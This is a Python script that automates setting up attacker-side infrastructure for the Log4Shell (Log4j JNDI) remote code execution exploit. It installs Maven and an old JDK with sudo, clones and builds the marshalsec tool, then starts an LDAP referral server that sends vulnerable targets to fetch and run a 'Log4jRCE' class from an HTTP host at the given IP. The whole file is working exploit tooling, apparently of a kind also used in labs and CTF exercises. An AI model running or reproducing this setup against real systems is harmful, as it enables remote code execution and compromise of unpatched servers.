#!/usr/bin/env python3
import subprocess
from os import path
import os
import sys
from ipaddress import IPv4Address


try:
    ip_addr = sys.argv[1]
except:
    print("ERR: Need IP to bind to.\nExample: python3 log4warn.py 192.168.1.132")
    exit()


print("** Starting: Invoke python3... **")
print("** Running: Update Packages..**\n")
subprocess.run(["sudo", "apt", "update"])

try:
    mvn_check = subprocess.run(["mvn", "--version"], capture_output=True)
    print("\n**Apache Maven already installed! Continuing!\n**")
except:
    print("\n**Running: INSTALL MVM (Task)**\n")
    subprocess.run(["sudo", "apt", "install", "maven"])

print("\n**Wait: Checking JDK Version**\n")
try:
    jdk_check = subprocess.run(["javac", "-version"], capture_output=True)
    print("\n**JDK already installed! Continuing!\n**")
except:
    print("\n**Running: Downloading JDK (Task)**\n")
    subprocess.run(["wget", "https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz"])
    print("\n**Extracting JDK**\n")
    if path.exists("/opt/jdk"):
        print("/opt/jdk already exists. Will now continue to extract.")
    else:
        subprocess.run(["sudo", "mkdir", "/opt/jdk"])
        subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/jdk1.8.0_181/bin/java", "100"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/jdk1.8.0_181/bin/javac", "100"])
        subprocess.run(["sudo", "update-alternatives", "--display", "java"])
        subprocess.run(["sudo", "update-alternatives", "--display", "javac"])
        subprocess.run(["sudo", "update-alternatives", "--set", "/opt/jdk/jdk1.8.0_181/bin/java"])
        subprocess.run(["java", "-version"])

print("\n**Wait: Clone marshalsec...**\n")
subprocess.run(["git", "clone", "https://github.com/mbechler/marshalsec.git"])


print("\n**Wait: Setup marshalsec...**\n")
cwd = os.getcwd()
os.chdir("./marshalsec/")
print(os.listdir())
subprocess.run(["mvn", "clean", "package", "-DskipTests"])

try:
    print("\n**Final Task: Invoke java...**\n")
    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
except:
    print("Something went wrong. Please check that you have the correct ip address")
    
